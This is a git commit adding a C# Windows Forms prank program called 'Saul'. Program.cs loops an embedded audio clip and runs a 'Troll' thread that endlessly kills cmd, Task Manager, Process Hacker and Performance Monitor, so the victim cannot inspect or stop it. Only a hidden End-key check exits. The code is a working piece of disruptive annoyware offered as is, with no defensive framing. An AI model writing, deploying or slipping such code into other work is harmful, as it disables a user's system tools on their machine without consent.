00a8eb8874e0d589da858ed5618ac63a22eb27ea
Everenel <105943017+Everenel@users.noreply.github.com>
2022-07-15 22:59:07 +0200

    Add files via upload

---
+++ GetSauled1.cs
@@ -0,0 +1,35 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Threading;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+
+namespace Saul
+{
+    public partial class GetSauled1 : Form
+    {
+        public GetSauled1()
+        {
+            InitializeComponent();
+
+        }
+
+        private void Form1_Load(object sender, EventArgs e)
+        {
+
+        }
+
+
+
+
+        private void pictureBox1_Click(object sender, EventArgs e)
+        {
+
+        }
+    }
+}
---
+++ Program.cs
@@ -0,0 +1,67 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.Linq;
+using System.Media;
+using System.Runtime.InteropServices;
+using System.Threading;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+
+namespace Saul
+{
+    internal static class Program
+    {
+        /// <summary>
+        /// The main entry point for the application.
+        /// </summary>
+        [STAThread]
+
+        [DllImport("user32.dll")]
+        static extern short GetAsyncKeyState(Keys vkey);
+
+        static void Main()
+        {
+
+            new Thread(() =>
+            {
+                while (true)
+                {
+                    if (GetAsyncKeyState(Keys.End) < 0)
+                    {
+                        Environment.Exit(0);
+                    }
+                };
+            }).Start();
+
+            SoundPlayer audio = new SoundPlayer(Saul.Properties.Resources.Saul_goodman_3d__1_);
+
+
+            audio.PlayLooping();
+
+
+            new Thread(() =>
+            {
+                while (true) { Troll(); }
+            }).Start();
+            Application.EnableVisualStyles();
+            Application.SetCompatibleTextRenderingDefault(false);
+            Application.Run(new Form1());
+         
+        }
+
+        static void Troll()
+        {
+            string[] ProcessyDoZamkniecia = { "cmd", "Taskmgr", "Processhacker", "perfmon" };
+            foreach (string zlyprocess in ProcessyDoZamkniecia)
+            {
+                foreach (var process in Process.GetProcessesByName(zlyprocess))
+                {
+                    try { process.Kill(); } catch { }
+
+                }
+            }
+          
+        }
+    }
+}
